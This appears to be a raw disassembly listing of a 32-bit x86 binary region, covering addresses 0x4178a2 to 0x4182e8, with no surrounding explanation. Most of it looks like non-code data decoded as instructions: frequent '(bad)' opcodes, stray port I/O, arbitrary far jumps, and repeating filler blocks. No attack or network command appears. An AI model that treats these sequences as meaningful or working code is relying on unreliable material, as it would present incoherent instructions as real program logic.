  4178a2:	pusha  
  4178a3:	jno    0x417898
  4178a5:	daa    
  4178a6:	loopne 0x4178af
  4178a8:	dec    edi
  4178a9:	and    eax,0x69516b54
  4178ae:	scas   eax,DWORD PTR es:[edi]
  4178af:	jmp    0x417851
  4178b1:	(bad)  
  4178b2:	test   eax,0x7fa746d9
  4178b7:	mov    ah,0x54
  4178b9:	xor    cl,BYTE PTR [ebp-0xe]
  4178bc:	lock je 0x4178f3
  4178bf:	leave  
  4178c0:	jmp    0x13ca7def
  4178c5:	aaa    
  4178c6:	mov    ds:0x7be254c,al
  4178cb:	in     al,dx
  4178cc:	jae    0x417891
  4178ce:	cmp    DWORD PTR [edx+0x51],eax
  4178d1:	adc    ah,cl
  4178d3:	sbb    BYTE PTR [ebp-0x619dcb75],bl
  4178d9:	retf   
  4178da:	sahf   
  4178db:	outs   dx,DWORD PTR ds:[esi]
  4178dc:	addr16 aam 0x99
  4178df:	mov    ch,0xa3
  4178e1:	adc    BYTE PTR [edi-0x13],dl
  4178e4:	call   DWORD PTR [ebx-0x21]
  4178e7:	test   eax,0x178a0018
  4178ec:	inc    esp
  4178ed:	ins    BYTE PTR es:[edi],dx
  4178ee:	ja     0x4178a7
  4178f0:	sbb    DWORD PTR [ecx+0x67c2f758],edi
  4178f6:	std    
  4178f7:	fstp   TBYTE PTR [ebp+0x74]
  4178fa:	jecxz  0x417958
  4178fc:	mov    DWORD PTR [edx-0x77d8bc2f],esp
  417902:	mov    WORD PTR [ebp-0x2ea66873],ds
  417908:	fmul   QWORD PTR [eax-0x18]
  41790b:	jbe    0x4178b1
  41790d:	std    
  41790e:	adc    BYTE PTR [ebp+0x0],0x0
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	inc    ebp
  417981:	(bad)  
  417982:	test   al,0x46
  417984:	js     0x41797f
  417986:	add    BYTE PTR [eax],al
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	les    esi,FWORD PTR [ecx]
  41798e:	addr16 adc al,0x18
  417991:	mov    BYTE PTR [edi+0x414ac77a],ah
  417997:	push   esp
  417998:	mov    ecx,edx
  41799a:	xchg   esp,eax
  41799b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41799c:	jno    0x417979
  41799e:	jmp    0x4179e4
  4179a0:	adc    al,0x47
  4179a2:	pop    ss
  4179a3:	pop    edx
  4179a4:	das    
  4179a5:	mov    al,ds:0x41244db3
  4179aa:	mov    ah,0x31
  4179ac:	dec    ebx
  4179ad:	(bad)  
  4179ae:	addr16 inc esp
  4179b0:	loop   0x41794c
  4179b2:	pop    esi
  4179b3:	pusha  
  4179b4:	retf   0xce84
  4179b7:	adc    dh,0xd2
  4179ba:	jae    0x41798a
  4179bc:	jecxz  0x417992
  4179be:	dec    esi
  4179bf:	iret   
  4179c0:	push   eax
  4179c1:	sahf   
  4179c2:	es ret 
  4179c4:	xchg   esp,eax
  4179c5:	mov    ah,0xf5
  4179c7:	mov    ds:0x3d0e2f0d,eax
  4179cc:	pop    ss
  4179cd:	xlat   BYTE PTR ds:[ebx]
  4179ce:	imul   esi,DWORD PTR [ecx-0x6fd0346c],0xc4cc063a
  4179d8:	push   ebx
  4179d9:	ds jne 0x4179ca
  4179dc:	out    dx,al
  4179dd:	scas   al,BYTE PTR es:[edi]
  4179de:	mov    cs,WORD PTR [ebp+0x734a9a5c]
  4179e4:	or     ebp,esp
  4179e6:	cmp    dl,BYTE PTR ds:0xe15e0da0
  4179ec:	sbb    esp,DWORD PTR [esi]
  4179ee:	cwde   
  4179ef:	add    ecx,eax
  4179f1:	pop    ds
  4179f2:	cs push edx
  4179f4:	push   0xffffffea
  4179f6:	mov    ebx,0xcb7a0481
  4179fb:	shl    DWORD PTR [edi+0x46],cl
  4179fe:	leave  
  4179ff:	cs sbb al,bh
  417a02:	and    eax,0x85800608
  417a07:	std    
  417a08:	outs   dx,BYTE PTR gs:[esi]
  417a0a:	dec    edi
  417a0b:	mov    WORD PTR [esi-0x40],fs
  417a0e:	dec    ebp
  417a0f:	arpl   WORD PTR [ecx],cx
  417a11:	dec    eax
  417a12:	shr    ah,cl
  417a14:	adc    ah,BYTE PTR [esi]
  417a16:	das    
  417a17:	cmp    BYTE PTR [edx+ebx*1+0x56d8ad9],al
  417a1e:	sub    al,0x1
  417a20:	pop    ds
  417a21:	fs jbe 0x417a6b
  417a24:	sbb    eax,0x3dbc5ac6
  417a29:	call   0xb41c:0xbbf3cc97
  417a30:	out    dx,eax
  417a31:	call   DWORD PTR [ebp+0x5c1481dc]
  417a37:	in     eax,dx
  417a38:	cmc    
  417a39:	cmp    al,0xed
  417a3b:	inc    esp
  417a3c:	jecxz  0x417a24
  417a3e:	loop   0x4179c4
  417a40:	mov    al,ds:0xdef9be4b
  417a45:	push   esi
  417a46:	out    dx,al
  417a47:	mov    DWORD PTR [bp+di-0x3f18],ecx
  417a4c:	mov    ebp,0xa23eec8c
  417a51:	retf   
  417a52:	add    BYTE PTR [eax],0x67
  417a55:	repnz and ebx,ebp
  417a58:	mov    ds:0x70c191ee,eax
  417a5d:	and    BYTE PTR [bx-0x18],al
  417a61:	mov    eax,0x6b21cc56
  417a66:	bound  ecx,QWORD PTR [ebx]
  417a68:	jecxz  0x4179fc
  417a6a:	pop    eax
  417a6b:	imul   esi,DWORD PTR [ebx-0x29],0xffffffe1
  417a6f:	fcomp  DWORD PTR [ecx]
  417a71:	inc    esp
  417a72:	sub    al,0x62
  417a74:	push   cs
  417a75:	sub    ecx,edi
  417a77:	pop    ebp
  417a78:	clc    
  417a79:	push   cs
  417a7a:	mov    bl,0x61
  417a7c:	sbb    DWORD PTR [edi],esi
  417a7e:	mov    ecx,ebp
  417a80:	fadd   QWORD PTR [ecx+ecx*2+0x24]
  417a84:	dec    DWORD PTR [ebx-0x7f1f4601]
  417a8a:	jbe    0x417a36
  417a8c:	jl     0x417a5f
  417a8e:	(bad)  
  417a8f:	xchg   ecx,eax
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0xac61996]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	int3   
  417b0d:	xor    edx,DWORD PTR [eax-0x66]
  417b10:	add    ecx,DWORD PTR [edx]
  417b12:	retf   0x30fc
  417b15:	dec    ebx
  417b16:	inc    ebp
  417b17:	mov    edx,DWORD PTR ds:0xc7910058
  417b1d:	mov    ebx,0x2dc15720
  417b22:	bound  ebx,QWORD PTR [ebx+0x28]
  417b25:	fcmovnb st,st(7)
  417b27:	mov    ecx,0xbf647786
  417b2c:	mov    edi,0x10c767a2
  417b31:	aaa    
  417b32:	jno    0x417af9
  417b34:	jmp    0x4224:0x520af73d
  417b3b:	pushf  
  417b3c:	(bad)  
  417b3d:	fdiv   QWORD PTR [eax]
  417b3f:	jae    0x417af4
  417b41:	out    0xc1,al
  417b43:	scas   eax,DWORD PTR es:[edi]
  417b44:	sbb    eax,DWORD PTR [esi]
  417b46:	push   esi
  417b47:	mov    bl,0xa1
  417b49:	lock sbb BYTE PTR [esi],ch
  417b4c:	mov    cl,0x70
  417b4e:	and    ah,BYTE PTR [ebp+0x71e86be8]
  417b54:	nop
  417b55:	call   0x533f:0x7375ea7a
  417b5c:	and    al,0xb9
  417b5e:	mov    al,0x46
  417b60:	or     bh,ah
  417b62:	add    al,BYTE PTR [eax+0x33]
  417b65:	outs   dx,DWORD PTR ds:[esi]
  417b66:	(bad)  
  417b67:	adc    BYTE PTR [ebp-0x60a2adca],ch
  417b6d:	out    dx,eax
  417b6e:	in     eax,0xa6
  417b70:	inc    ebx
  417b71:	xor    dh,bh
  417b73:	jl     0x417b20
  417b75:	mov    cl,0x34
  417b77:	push   ss
  417b78:	sti    
  417b79:	jmp    0xc4bf:0x1607b62d
  417b80:	add    edi,DWORD PTR [edx]
  417b82:	adc    eax,0xe8d3d16c
  417b87:	scas   al,BYTE PTR es:[edi]
  417b88:	adc    esp,DWORD PTR ds:0xdca74145
  417b8e:	xor    al,0x5f
  417b90:	iret   
  417b91:	sbb    DWORD PTR [ecx-0x16541e5],edx
  417b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b98:	jns    0x417b30
  417b9a:	in     al,0x77
  417b9c:	mov    cl,0xf3
  417b9e:	aas    
  417b9f:	add    eax,DWORD PTR [edi+0x17203956]
  417ba5:	std    
  417ba6:	mov    edx,0xb9f0d5fc
  417bab:	pause  
  417bad:	push   esp
  417bae:	jb     0x417b66
  417bb0:	xor    al,0x41
  417bb2:	and    DWORD PTR [ebp-0x44c28283],0xb7f12146
  417bbc:	add    eax,0x4b802c0c
  417bc1:	mov    ch,0x91
  417bc3:	fild   QWORD PTR [ebp+0x31]
  417bc6:	popa   
  417bc7:	icebp  
  417bc8:	inc    ecx
  417bc9:	and    eax,0x87d74ab6
  417bce:	and    BYTE PTR [ecx-0x5b],ch
  417bd1:	xchg   ecx,eax
  417bd2:	mov    eax,ds:0x5a8cd18a
  417bd7:	sti    
  417bd8:	xchg   ebp,eax
  417bd9:	push   esp
  417bda:	dec    edi
  417bdb:	xchg   DWORD PTR [eax],edx
  417bdd:	jae    0x417c21
  417bdf:	aad    0x6b
  417be1:	pop    es
  417be2:	push   esi
  417be3:	ror    DWORD PTR [esp+ebx*4-0x263c0d7e],cl
  417bea:	fldenv [edx+0x217b59f8]
  417bf0:	jl     0x417bb4
  417bf2:	jo     0x417c1f
  417bf4:	daa    
  417bf5:	pop    ds
  417bf6:	xor    al,0x10
  417bf8:	(bad)  
  417bf9:	sub    edx,DWORD PTR [esi+0x15]
  417bfc:	xchg   esi,eax
  417bfd:	add    BYTE PTR [ecx+eiz*8+0x7c],dl
  417c01:	stos   BYTE PTR es:[edi],al
  417c02:	stos   BYTE PTR es:[edi],al
  417c03:	mov    ecx,0xd91655aa
  417c08:	mov    ecx,ebx
  417c0a:	es icebp 
  417c0c:	pop    es
  417c0d:	and    eax,0x3e2
	...
  417c72:	add    BYTE PTR [eax],al
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x2a
  417c81:	retf   0x1975
  417c84:	cmp    bl,0x0
  417c87:	add    BYTE PTR [ecx+eax*1],al
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	ret    0xd39
  417c8f:	inc    esi
  417c90:	les    eax,FWORD PTR [esi-0x30]
  417c93:	gs pusha 
  417c95:	sbb    eax,0x5a8c0750
  417c9a:	ja     0x417c2f
  417c9c:	je     0x417cfa
  417c9e:	push   0x1b8fd060
  417ca3:	imul   esi,DWORD PTR [ecx+0x68dc5063],0xffffffb1
  417caa:	mov    ds:0x9d8262,eax
  417caf:	push   0x48
  417cb1:	pop    esi
  417cb2:	xlat   BYTE PTR ds:[ebx]
  417cb3:	test   al,0x58
  417cb5:	push   ecx
  417cb6:	xor    esp,DWORD PTR [eax]
  417cb8:	pop    edx
  417cb9:	xchg   edx,eax
  417cba:	cli    
  417cbb:	jo     0x417c95
  417cbd:	add    al,0x35
  417cbf:	xor    eax,0xe80ec7ae
  417cc4:	into   
  417cc5:	and    al,0xb7
  417cc7:	das    
  417cc8:	mov    eax,ds:0x51343f1
  417ccd:	ins    BYTE PTR es:[edi],dx
  417cce:	and    DWORD PTR fs:[edx+0x52],ebp
  417cd2:	mov    bh,BYTE PTR [ebx]
  417cd4:	ins    BYTE PTR es:[edi],dx
  417cd5:	shl    ecx,1
  417cd7:	scas   al,BYTE PTR es:[edi]
  417cd8:	sbb    bl,BYTE PTR [ecx-0x4cb845fd]
  417cde:	add    ah,BYTE PTR [eax]
  417ce0:	cmp    bh,ah
  417ce2:	aad    0xb8
  417ce4:	inc    ebx
  417ce5:	jl     0x417cff
  417ce7:	fisub  WORD PTR [eax]
  417ce9:	inc    esi
  417cea:	cmp    DWORD PTR [ebx+0xe],ecx
  417ced:	mov    DWORD PTR [edi-0x3],edi
  417cf0:	mov    ebp,0xf825b505
  417cf5:	mov    DWORD PTR [ecx+0x736e248e],eax
  417cfb:	stos   BYTE PTR es:[edi],al
  417cfc:	cmp    dl,ch
  417cfe:	std    
  417cff:	mov    ?,WORD PTR [eax+0x12]
  417d02:	mov    bh,0x9a
  417d04:	mov    bh,0x9c
  417d06:	dec    ecx
  417d07:	test   eax,0x827dc060
  417d0c:	dec    edx
  417d0d:	mov    edx,DWORD PTR ds:0xf315d42
  417d13:	xor    BYTE PTR [edi-0x34dc434f],ch
  417d19:	lds    si,DWORD PTR [edi-0x731bfda5]
  417d20:	lds    edi,FWORD PTR [edx+0x6c]
  417d23:	lahf   
  417d24:	mov    DWORD PTR [ebx-0x58512380],eax
  417d2a:	sbb    al,0x48
  417d2c:	and    eax,0x6679df7f
  417d31:	mov    ds:0x9b4dc86f,al
  417d36:	cs inc esi
  417d38:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  417d3a:	cld    
  417d3b:	ins    BYTE PTR es:[edi],dx
  417d3c:	xchg   esp,eax
  417d3d:	jmp    0x417cd9
  417d3f:	mov    ds:0xe50d041e,eax
  417d44:	mov    ebp,ecx
  417d46:	jle    0x417dc3
  417d48:	popf   
  417d49:	data16 jg 0x417d27
  417d4c:	jo     0x417d14
  417d4e:	pop    edi
  417d4f:	cli    
  417d50:	js     0x417d3a
  417d52:	jns    0x417cf9
  417d54:	pop    esp
  417d55:	xchg   edi,eax
  417d56:	xchg   DWORD PTR [esi-0x6af9131c],esi
  417d5c:	popf   
  417d5d:	push   edi
  417d5e:	setp   BYTE PTR [esi+0x1f2d8609]
  417d65:	mov    ebp,ebx
  417d67:	xchg   esp,eax
  417d68:	shl    BYTE PTR [esi+0x2cfdd875],1
  417d6e:	call   0x3e4cc0d3
  417d73:	repnz cwde 
  417d75:	inc    edi
  417d76:	mov    bl,0x7d
  417d78:	sub    eax,esi
  417d7a:	mov    bl,0x8d
  417d7c:	popf   
  417d7d:	and    eax,ecx
  417d7f:	sbb    BYTE PTR [edx-0x52fef965],al
  417d85:	sar    DWORD PTR [ebx+0x567ecb6d],cl
  417d8b:	mov    al,ds:0x6d2e5859
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	ins    DWORD PTR es:[edi],dx
  417e01:	leave  
  417e02:	sbb    dl,BYTE PTR [edx+0xfc84]
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	jmp    0xc29bdc5c
  417e11:	mov    dl,0xc2
  417e13:	push   es
  417e14:	jle    0x417dc1
  417e16:	push   esi
  417e17:	jl     0x417e6e
  417e19:	daa    
  417e1a:	call   0x66fecac3
  417e1f:	outs   dx,DWORD PTR ds:[esi]
  417e20:	add    bl,BYTE PTR [edx-0x7c6ad122]
  417e26:	xchg   edx,eax
  417e27:	(bad)  
  417e28:	xlat   BYTE PTR ds:[ebx]
  417e29:	stos   BYTE PTR es:[edi],al
  417e2a:	pop    ebp
  417e2b:	popa   
  417e2c:	ret    0x8111
  417e2f:	cmp    esi,edx
  417e31:	call   0x81c:0xc7288bae
  417e38:	mov    dh,0xdc
  417e3a:	les    edx,FWORD PTR [esi]
  417e3c:	test   DWORD PTR [edi-0x425c55ae],0xe31441a3
  417e46:	mov    dl,0x9b
  417e48:	retf   0xfa11
  417e4b:	adc    bl,cl
  417e4d:	inc    esp
  417e4e:	in     al,dx
  417e4f:	into   
  417e50:	push   ebx
  417e51:	pop    edx
  417e52:	jno    0x417e73
  417e54:	retf   0x950e
  417e57:	mov    ebx,0x7fc30d31
  417e5c:	sub    al,0xb2
  417e5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e5f:	pop    eax
  417e60:	lds    ebp,FWORD PTR [ebp-0x445a3d56]
  417e66:	rcl    DWORD PTR [ecx],0x6c
  417e69:	mov    edi,0xca7f95a9
  417e6e:	jb     0x417e56
  417e70:	dec    edx
  417e71:	mov    bl,0x85
  417e73:	arpl   WORD PTR [ecx+0x7f43e255],si
  417e79:	sti    
  417e7a:	(bad)  
  417e7b:	adc    eax,0x700e88b8
  417e80:	mov    dl,0x11
  417e82:	jns    0x417e63
  417e84:	loope  0x417e7d
  417e86:	out    0xae,al
  417e88:	inc    ebx
  417e89:	mov    WORD PTR [esi+0x4a0b7e01],fs
  417e8f:	data16 in al,dx
  417e91:	xor    cl,bl
  417e93:	dec    edi
  417e94:	xor    edx,DWORD PTR [ebp+0xb8d4311]
  417e9a:	stos   BYTE PTR es:[edi],al
  417e9b:	retf   0x54a6
  417e9e:	idiv   dl
  417ea0:	stc    
  417ea1:	aad    0x33
  417ea3:	xchg   esp,eax
  417ea4:	rol    DWORD PTR [eax-0x72],cl
  417ea7:	push   esi
  417ea8:	jmp    0xfc0c:0x5f1c3afe
  417eaf:	cmp    ah,al
  417eb1:	sub    ebp,DWORD PTR [edi]
  417eb3:	shl    edi,0x1b
  417eb6:	ja     0x417ec4
  417eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eb9:	into   
  417eba:	fwait
  417ebb:	loope  0x417e51
  417ebd:	sbb    al,0x31
  417ebf:	cld    
  417ec0:	xchg   ecx,eax
  417ec1:	jmp    0x417f29
  417ec3:	push   es
  417ec4:	jmp    0xf467:0xcd3fe94
  417ecb:	sbb    eax,0x47e29ff0
  417ed0:	hlt    
  417ed1:	addr16 push ss
  417ed3:	inc    eax
  417ed4:	mov    cl,0x95
  417ed6:	adc    ch,ah
  417ed8:	rcr    ecx,1
  417eda:	and    DWORD PTR [esi],ecx
  417edc:	xchg   edi,eax
  417edd:	inc    esi
  417ede:	add    esi,DWORD PTR [edi-0x29]
  417ee1:	verw   WORD PTR [edx-0xff7c12a]
  417ee8:	jbe    0x417f2b
  417eea:	out    dx,al
  417eeb:	rcl    BYTE PTR [esi-0x17],cl
  417eee:	cmp    BYTE PTR [esi+0x25831594],ch
  417ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ef5:	inc    ebp
  417ef6:	xchg   ah,ch
  417ef8:	int    0xc0
  417efa:	mov    ebp,0x85fcb2d9
  417eff:	lds    ecx,FWORD PTR [ebx]
  417f01:	cmc    
  417f02:	les    esi,FWORD PTR [ecx+0x403aa2f1]
  417f08:	sub    ebp,edx
  417f0a:	xchg   edi,eax
  417f0b:	ficomp WORD PTR [edi+0x696a04]
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	and    ah,BYTE PTR [ebx-0x6f]
  417f83:	popf   
  417f84:	mov    ch,bh
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    al,0x1
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	adc    bl,BYTE PTR [edx+esi*2]
  417f8f:	pop    ss
  417f90:	rcr    BYTE PTR [edi+0x546f253c],cl
  417f96:	ror    DWORD PTR [eax-0x17],0xcb
  417f9a:	push   edx
  417f9b:	mov    cl,bh
  417f9d:	cli    
  417f9e:	iret   
  417f9f:	push   esi
  417fa0:	mov    esp,0x7acc4d4b
  417fa5:	push   0x19e6e340
  417faa:	pop    edi
  417fab:	adc    DWORD PTR [edx+0x1c],ecx
  417fae:	aas    
  417faf:	inc    ebx
  417fb0:	aas    
  417fb1:	and    ch,0x1e
  417fb4:	sbb    eax,0x68fff716
  417fb9:	mov    al,0x6d
  417fbb:	mov    ch,BYTE PTR [ecx+0x56]
  417fbe:	adc    eax,0x21e003b9
  417fc3:	sub    esi,0x7663138
  417fc9:	in     al,0x80
  417fcb:	sahf   
  417fcc:	mov    ah,0x54
  417fce:	jmp    0x417f97
  417fd0:	iret   
  417fd1:	adc    al,0xe
  417fd3:	adc    DWORD PTR [edi],ecx
  417fd5:	add    eax,0x550eb8c1
  417fda:	xchg   BYTE PTR [ebx],dh
  417fdc:	xor    DWORD PTR [ebp-0x505828d4],esp
  417fe2:	dec    ebp
  417fe3:	js     0x418023
  417fe5:	push   edi
  417fe6:	stos   DWORD PTR es:[edi],eax
  417fe7:	xchg   BYTE PTR [edi],ah
  417fe9:	ret    
  417fea:	leave  
  417feb:	xchg   edi,eax
  417fec:	ret    
  417fed:	or     BYTE PTR [ecx-0x54894930],0xeb
  417ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ff5:	dec    edi
  417ff6:	jge    0x417fa5
  417ff8:	test   eax,0xe9d6deee
  417ffd:	xchg   BYTE PTR [esi],cl
  417fff:	(bad)  
  418000:	push   esi
  418001:	shl    dh,0x6a
  418004:	inc    esi
  418005:	pop    ebx
  418006:	sub    esi,DWORD PTR [edx-0x7c01f855]
  41800c:	pop    eax
  41800d:	pop    ebx
  41800e:	call   0xd563bbee
  418013:	fsubr  st(2),st
  418015:	xor    BYTE PTR [esi+eiz*1+0x61],0x2d
  41801a:	repnz pop es
  41801c:	test   DWORD PTR [edi+0x7c],0x43fe83f
  418023:	retf   
  418024:	and    BYTE PTR [esi+0x66],ah
  418027:	mov    cl,0x31
  418029:	lds    eax,FWORD PTR [ebp-0x660ea272]
  41802f:	inc    esp
  418030:	ins    BYTE PTR es:[edi],dx
  418031:	xor    eax,DWORD PTR [edi+0x10]
  418034:	mov    esi,0x95e58f60
  41803a:	pop    ebp
  41803b:	mov    BYTE PTR [ebx+ebp*4+0x3d],bl
  41803f:	mov    al,ds:0x6045ad87
  418044:	mov    ah,0x73
  418046:	ins    BYTE PTR es:[edi],dx
  418047:	lds    edx,FWORD PTR [edi]
  418049:	(bad)  
  41804a:	idiv   bl
  41804c:	dec    ebx
  41804d:	mov    bh,0x16
  41804f:	push   eax
  418050:	aaa    
  418051:	or     bh,BYTE PTR [eax-0x7bbd2eb6]
  418057:	mov    esp,0xb6f9243a
  41805c:	mov    eax,0x2728f37c
  418061:	lock jae 0x418052
  418064:	mov    ebp,cs
  418066:	std    
  418067:	scas   eax,DWORD PTR es:[edi]
  418068:	add    edi,DWORD PTR [eax-0x3435b1e0]
  41806e:	xor    eax,0x3240fa8d
  418073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418074:	cmp    BYTE PTR [ebp+eiz*4-0x45b61319],dh
  41807b:	sahf   
  41807c:	(bad)  
  41807d:	xor    al,0x98
  41807f:	pop    DWORD PTR [edx+eax*1+0x41581dcf]
  418086:	repnz cs pop ebx
  418089:	sbb    bh,BYTE PTR [esi-0x62de0f1a]
  41808f:	sldt   WORD PTR [eax]
	...
  4180f2:	add    BYTE PTR [eax],al
  4180f4:	test   eax,0xff456b7e
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x2c2fdebc,eax
  418101:	mov    bh,BYTE PTR [edx+0xfe8c16]
  418107:	add    BYTE PTR [ecx+eax*1],al
  41810a:	add    BYTE PTR [eax],al
  41810c:	data16 aas 
  41810e:	into   
  41810f:	shl    BYTE PTR [ebp-0x1ebf09f3],1
  418115:	les    edi,FWORD PTR [ebx+0x249f1224]
  41811b:	cmp    DWORD PTR [esi-0xaec0c3a],ebx
  418121:	adc    dh,al
  418123:	sbb    al,0x7e
  418125:	jle    0x4180f2
  418127:	clc    
  418128:	dec    DWORD PTR [esi+0x531a6398]
  41812e:	not    DWORD PTR [ecx-0x34369640]
  418134:	inc    ebx
  418135:	jns    0x418156
  418137:	sbb    BYTE PTR [edi+0x6],0x23
  41813b:	popf   
  41813c:	fwait
  41813d:	jle    0x4181bd
  41813f:	idiv   esi
  418141:	retf   
  418142:	add    BYTE PTR [ebx-0x5e],0x87
  418146:	lods   al,BYTE PTR ds:[esi]
  418147:	imul   ecx,edi,0xfffffffe
  41814a:	xor    eax,0x6352c80f
  41814f:	out    0x11,eax
  418151:	outs   dx,BYTE PTR ds:[esi]
  418152:	in     eax,dx
  418153:	imul   eax,DWORD PTR [ebx+0x2c],0x3a
  418157:	loopne 0x418103
  418159:	jp     0x4181bc
  41815b:	or     BYTE PTR [ecx],bl
  41815d:	mov    bl,0x9b
  41815f:	xor    eax,0xe425fb33
  418164:	gs xchg edi,eax
  418166:	cld    
  418167:	jp     0x418152
  418169:	sbb    edx,esi
  41816b:	adc    eax,0xe6924df4
  418170:	mov    dh,0x93
  418172:	pusha  
  418173:	mov    ah,0x16
  418175:	sub    eax,0xdb777b44
  41817a:	lods   eax,DWORD PTR ds:[esi]
  41817b:	dec    ebx
  41817c:	xchg   esp,eax
  41817d:	scas   eax,DWORD PTR es:[edi]
  41817e:	fst    QWORD PTR [esi]
  418180:	(bad)  
  418181:	int    0x65
  418183:	push   0x2a7fceb1
  418188:	add    ah,dh
  41818a:	aad    0x58
  41818c:	and    al,0x78
  41818e:	aas    
  41818f:	jo     0x41817a
  418191:	pusha  
  418192:	xor    esp,edi
  418194:	dec    ecx
  418195:	repnz addr16 int 0xd7
  418199:	icebp  
  41819a:	rcr    BYTE PTR [ecx-0x45],1
  41819d:	out    dx,eax
  41819e:	cmp    BYTE PTR [esi],cl
  4181a0:	imul   eax,DWORD PTR [edi],0x3e76b3fc
  4181a6:	stos   BYTE PTR es:[edi],al
  4181a7:	nop
  4181a8:	jno    0x418200
  4181aa:	dec    edx
  4181ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181ac:	aad    0xde
  4181ae:	mov    ecx,0x655125ec
  4181b3:	pop    esi
  4181b4:	ja     0x4181a9
  4181b6:	push   0xffffffc4
  4181b8:	popa   
  4181b9:	gs (bad) 
  4181bb:	daa    
  4181bc:	jne    0x41815c
  4181be:	ss jnp 0x41818c
  4181c1:	push   eax
  4181c2:	out    dx,al
  4181c3:	jnp    0x418224
  4181c5:	imul   ebx,edx,0xac251740
  4181cb:	icebp  
  4181cc:	pop    es
  4181cd:	add    BYTE PTR [edi+0xe92a733],0x45
  4181d4:	outs   dx,DWORD PTR ds:[esi]
  4181d5:	inc    edi
  4181d6:	mov    cl,0xe7
  4181d8:	pop    ecx
  4181d9:	pop    ds
  4181da:	int3   
  4181db:	dec    ebx
  4181dc:	ret    0xfe2c
  4181df:	jge    0x4181db
  4181e1:	dec    eax
  4181e2:	pusha  
  4181e3:	les    eax,FWORD PTR [edx-0x32]
  4181e6:	fdiv   st(2),st
  4181e8:	out    0xa1,eax
  4181ea:	sar    DWORD PTR [edi],0x7
  4181ed:	pop    es
  4181ee:	lods   al,BYTE PTR ds:[esi]
  4181ef:	mov    cl,0xef
  4181f1:	ret    0x55f
  4181f4:	push   0x537dee35
  4181f9:	add    esp,esi
  4181fb:	(bad)  
  4181fc:	out    dx,eax
  4181fd:	retf   
  4181fe:	mul    DWORD PTR [ebx+eiz*2-0x18]
  418202:	add    DWORD PTR [ecx-0x7b],ebp
  418205:	push   ss
  418206:	aam    0x2e
  418208:	in     eax,dx
  418209:	pop    esp
  41820a:	stos   DWORD PTR es:[edi],eax
  41820b:	ror    DWORD PTR [ecx+ecx*8],1
  41820e:	push   cs
  41820f:	inc    esi
	...
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x1517b8d6
  418282:	sbb    dh,BYTE PTR [ebp-0x70]
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	and    DWORD PTR [edi],0xffffffb7
  41828f:	clc    
  418290:	push   edx
  418291:	mov    esp,0x58fe4d99
  418296:	cmp    cl,cl
  418298:	shl    BYTE PTR [ecx],0x93
  41829b:	cmp    ch,0x3e
  41829e:	je     0x418273
  4182a0:	js     0x4182f3
  4182a2:	jp     0x41822a
  4182a4:	mov    esp,0x689ce550
  4182a9:	push   0xb7cd8dd2
  4182ae:	push   cs
  4182af:	fimul  DWORD PTR [ecx+0x347d60de]
  4182b5:	aaa    
  4182b6:	rol    DWORD PTR [edx],cl
  4182b8:	fcom   DWORD PTR [edi+0x44]
  4182bb:	push   eax
  4182bc:	jnp    0x4182eb
  4182be:	mov    al,0xdf
  4182c0:	cld    
  4182c1:	inc    edi
  4182c2:	mov    al,ds:0x94279f76
  4182c7:	leave  
  4182c8:	inc    ebp
  4182c9:	sub    eax,DWORD PTR [esi-0x52273936]
  4182cf:	push   eax
  4182d0:	loop   0x4182a4
  4182d2:	jl     0x4182f2
  4182d4:	adc    BYTE PTR [ebx-0x7d5f8a98],cl
  4182da:	cld    
  4182db:	or     DWORD PTR [edi],edi
  4182dd:	xchg   ecx,eax
  4182de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182df:	out    0xc1,eax
  4182e1:	scas   eax,DWORD PTR es:[edi]
  4182e2:	pop    esp
  4182e3:	loope  0x418350
  4182e5:	or     ch,0xcf
  4182e8:	gs data16 jge 0x418364
